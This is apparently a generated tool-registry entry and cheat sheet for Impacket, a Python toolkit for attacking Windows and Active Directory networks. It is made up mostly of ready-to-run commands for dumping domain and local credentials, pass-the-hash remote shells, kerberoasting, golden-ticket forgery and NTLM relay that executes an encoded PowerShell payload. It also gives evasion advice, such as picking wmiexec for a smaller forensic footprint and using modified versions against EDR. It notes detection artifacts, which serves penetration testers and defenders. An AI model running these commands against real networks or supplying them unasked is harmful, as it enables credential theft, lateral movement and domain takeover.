---
name: Impacket
description: "Python toolkit for Windows/AD protocol exploitation: credential
  dumping, lateral movement, Kerberos attacks, and remote execution."
registry: registry
tool_id: impacket
category: active-directory
tags:
  - impacket
  - active-directory
  - credential-dumping
  - lateral-movement
  - kerberos
  - windows
  - smb
mitre_techniques:
  - T1003.002
  - T1003.003
  - T1021.002
  - T1021.003
  - T1021.006
  - T1047
  - T1550.002
  - T1550.003
  - T1558.003
  - T1557.001
summary: "Impacket is a collection of Python scripts for exploiting Windows
  network protocols (SMB, WMI, MSRPC, Kerberos). Primary use cases: credential
  dumping (secretsdump), remote code execution (psexec.py, wmiexec.py,
  smbexec.py, atexec.py), Kerberos attacks (GetUserSPNs.py for kerberoasting,
  ticketer.py for golden/silver tickets, getTGT.py for overpass-the-hash), NTLM
  relaying (ntlmrelayx.py), and lateral movement. Invoke with
  domain/username[:password]@target format or -hashes LM:NTLM for pass-the-hash.
  Supports Kerberos auth with -k flag and AES keys. Scripts leave detectable
  artifacts: psexec writes service binaries to ADMIN$, wmiexec spawns
  wmiprvse.exe→cmd.exe with distinctive /Q /c patterns, smbexec creates temp
  .bat files, secretsdump accesses HKLM\\SAM and SECURITY. All generate Windows
  Event IDs 4624, 4672, 5140, 7045. Use secretsdump for local SAM
  (-sam/-system/-security files) or remote DC credential extraction (-just-dc,
  -just-dc-ntlm, -just-dc-user). Prefer wmiexec over psexec when stealth matters
  (no service binary). Always verify target reachability and valid credentials
  before execution. Set KRB5CCNAME environment variable when using Kerberos
  tickets. Output contains NTLM hashes (format username:RID:LM:NTLM), plaintext
  passwords if reversible encryption enabled, and Kerberos keys."
sources:
  - https://neil-fox.github.io/Impacket-usage-&-detection/
  - https://reliaquest.com/blog/exploring-impacket-abuse/
  - https://www.kali.org/tools/impacket/
  - https://github.com/fortra/impacket
  - https://www.blackhillsinfosec.com/impacket-cheatsheet/
  - https://www.kali.org/tools/impacket-scripts/
  - https://github.com/fortra/impacket/blob/master/examples/wmiexec.py
  - https://redcanary.com/threat-detection-report/threats/impacket/
  - https://research.splunk.com/endpoint/8ce07472-496f-11ec-ab3b-3e22fbd008af/
  - https://www.synack.com/knowledge-base/red-teaming-vs-penetration-testing-understanding-the-differences/
  - https://www.picussecurity.com/resource/glossary/what-are-red-team-tools
  - https://www.ibm.com/think/topics/red-teaming
generated_at: 2026-05-19T11:03:03.900Z
generated_by: anthropic
source_hash: 2acdf2a76c29e198f965e3b59e48ff0019e7bdb4e092adbff0ebdf03d46d32cb
---

# Impacket

## Overview

Impacket is a Python-based offensive toolkit providing low-level programmatic access to Windows network protocols (SMB1-3, MSRPC, WMI, DCOM, Kerberos). Originally created by SecureAuth, now maintained by Fortra. Core capabilities include credential extraction, remote command execution, lateral movement, Kerberos ticket manipulation, and NTLM relay attacks. Widely used by penetration testers, red teams, and APT groups (Wizard Spider, Stone Panda). Scripts operate against Windows targets without requiring agent installation. Available in Kali Linux as impacket-* prefixed commands (/usr/bin/impacket-secretsdump, etc.).

## When to use

Use Impacket after initial access when you need to: (1) Dump credentials from Windows SAM, LSA secrets, or Active Directory (NTDS.dit) using secretsdump; (2) Execute commands remotely via psexec.py (SMB service), wmiexec.py (WMI), smbexec.py (SMB without binary), or atexec.py (scheduled tasks); (3) Move laterally across Windows networks with valid credentials or NTLM hashes; (4) Perform Kerberos attacks: kerberoasting with GetUserSPNs.py, golden/silver ticket creation with ticketer.py, overpass-the-hash with getTGT.py; (5) Enumerate SMB shares, users, and SIDs (smbclient.py, lookupsid.py); (6) Relay NTLM authentication with ntlmrelayx.py; (7) Manipulate remote registry with reg.py. Choose wmiexec over psexec for lower forensic footprint (no service binary written to disk). Use secretsdump for post-exploitation credential harvesting on compromised domain controllers or workstations.

## Authentication & setup

Impacket scripts accept authentication in multiple formats: (1) Username/password: domain/username:password@target; (2) Pass-the-hash: -hashes LM:NTLM (LM can be empty, use format :NTLMHASH); (3) Kerberos TGT: -k flag with KRB5CCNAME environment variable pointing to .ccache file; (4) AES Kerberos keys: -aesKey <128-bit or 256-bit hex key>; (5) No password prompt: -no-pass when using Kerberos or hash-based auth; (6) Keytab files: -keytab <file>. Specify domain controller with -dc-ip <ip> for Kerberos operations. Use -target-ip when target is NetBIOS name and DNS resolution unavailable. For Kerberos ticket attacks: generate TGT/TGS with ticketer.py or getTGT.py, export KRB5CCNAME=<ticket.ccache>, then invoke scripts with -k -no-pass flags. For NTLM relay: configure responder.py or mitm6 to capture credentials, then relay with ntlmrelayx.py -tf targets.txt -smb2support.

## Key commands / parameters

impacket-secretsdump: Dump credentials. Local: -sam <SAM> -system <SYSTEM> -security <SECURITY> LOCAL. Remote: domain/user@target -just-dc (all domain creds), -just-dc-ntlm (NTLM only), -just-dc-user <username> (single user), -history (password history), -use-vss (Volume Shadow Copy). Execution method: -exec-method {smbexec,wmiexec,mmcexec}. Output: -outputfile <base>.

impacket-psexec/wmiexec/smbexec/atexec: Remote execution. Format: domain/user@target [command]. psexec: writes service binary to ADMIN$ share. wmiexec: -share (default ADMIN$), -nooutput (no SMB connection), -shell-type {cmd,powershell}. smbexec: like psexec but no binary. atexec: uses scheduled tasks, -session-id for specific session.

impacket-GetUserSPNs: Kerberoasting. domain/user:pass -outputfile <hashfile> -request (request TGS for all SPNs), -dc-ip <DC>.

impacket-getTGT: Request TGT. domain/user -hashes :NTLM (outputs .ccache file).

impacket-ticketer: Generate tickets. -nthash <hash> -domain-sid <SID> -domain <domain> -spn <SPN> <username> (silver), omit -spn for golden.

impacket-ntlmrelayx: -tf <targets.txt> -smb2support -c <command> -socks (SOCKS proxy mode).

impacket-smbclient: domain/user@target (interactive SMB client). ls, cd, get, put, rm commands.

impacket-lookupsid: domain/user@target (brute force SIDs to enumerate users/groups).

## Example workflows

(1) Credential dumping from DC: impacket-secretsdump 'DOMAIN/admin:P@ssw0rd@dc01.domain.local' -just-dc-ntlm -outputfile dc_hashes → extracts all NTLM hashes from NTDS.dit.

(2) Pass-the-hash lateral movement: impacket-wmiexec -hashes :5f4dcc3b5aa765d61d8327deb882cf99 'DOMAIN/admin@10.10.10.50' → spawns semi-interactive shell using NTLM hash.

(3) Kerberoasting: impacket-GetUserSPNs 'DOMAIN/user:pass' -dc-ip 10.10.10.10 -request -outputfile spn_hashes.txt → crack with hashcat -m 13100.

(4) Golden ticket: impacket-ticketer -nthash <krbtgt_hash> -domain-sid S-1-5-21-... -domain DOMAIN.LOCAL Administrator → export KRB5CCNAME=Administrator.ccache → impacket-psexec DOMAIN/Administrator@dc01 -k -no-pass.

(5) Local SAM dump: impacket-secretsdump -sam sam.hive -system system.hive -security security.hive LOCAL → extracts local account hashes from offline registry hives.

(6) NTLM relay to SMB: impacket-ntlmrelayx -tf targets.txt -smb2support -c 'powershell -enc <base64_payload>' → relays captured NTLM auth and executes payload.

(7) Remote registry query: impacket-reg 'DOMAIN/user:pass@target' query -keyName HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run.

## Output format

secretsdump: Plaintext format username:RID:LMhash:NThash::: with sections for SAM hashes, cached domain credentials, LSA secrets, NTDS.dit entries. Kerberos keys shown as AES256-CTS-HMAC-SHA1-96 and AES128. Use -outputfile to save .ntds, .sam, .secrets files. 

Execution scripts (psexec/wmiexec/smbexec): Semi-interactive shell with command output returned over SMB/WMI. Stdout/stderr redirected through temp files in ADMIN$/C$ shares. Command prompt shows target hostname.

GetUserSPNs: Hashcat-compatible format $krb5tgs$23$*user$realm$spn*$hash for TGS-REP hashes. Use -outputfile for bulk extraction.

getTGT/ticketer: Outputs .ccache file containing TGT/TGS ticket. Binary format for use with KRB5CCNAME.

smbclient: Interactive output with SMB share listings, file metadata (size, timestamps). Standard Unix-like commands (ls, get, put).

ntlmrelayx: Real-time relay status showing captured credentials, relay attempts, command execution results. SOCKS mode provides proxy listener details.

## Common pitfalls

(1) Windows Defender/AV detection: Impacket signatures are well-known. Scripts generate distinctive process trees (wmiprvse.exe→cmd.exe, services.exe→cmd.exe) and command-line patterns (/Q /c echo, 2>&1, __output redirection) easily detected by EDR. Consider using modified versions or native Windows tools instead.

(2) Service artifacts: psexec.py writes service binaries to ADMIN$ share (generates Event IDs 7045, 7040) and creates registry keys under HKLM\System\CurrentControlSet\Services. Use wmiexec or smbexec for lower forensic footprint.

(3) Kerberos failures: -k flag requires proper DNS resolution to FQDN or manual -dc-ip specification. KRB5CCNAME must point to valid .ccache file. Time skew >5 minutes causes Kerberos authentication failures.

(4) NTLM hash format errors: Use :NTLMHASH format (colon prefix, no LM hash) or full LM:NTLM. Empty/null hashes cause authentication failures.

(5) Incorrect target format: Scripts require [[domain/]username[:password]@]target syntax. Missing @ separator causes parsing errors.

(6) SMB signing/encryption: Some scripts fail against targets with enforced SMB signing or SMB encryption. secretsdump requires SMB access to ADMIN$ share.

(7) Noisy network traffic: Impacket generates extensive SMB/RPC traffic. Multiple failed authentication attempts trigger account lockouts and SOC alerts.

(8) Output file handling: secretsdump appends to existing files. Remove old output files to avoid confusion.

(9) Privilege requirements: Remote execution scripts require local admin rights on target. secretsdump needs Domain Admin or DC machine account access for NTDS.dit extraction.

## References

• https://neil-fox.github.io/Impacket-usage-&-detection/
• https://reliaquest.com/blog/exploring-impacket-abuse/
• https://www.kali.org/tools/impacket/
• https://github.com/fortra/impacket
• https://www.blackhillsinfosec.com/impacket-cheatsheet/
• https://redcanary.com/threat-detection-report/threats/impacket/
• https://research.splunk.com/endpoint/8ce07472-496f-11ec-ab3b-3e22fbd008af/
• https://www.picussecurity.com/resource/glossary/what-are-red-team-tools
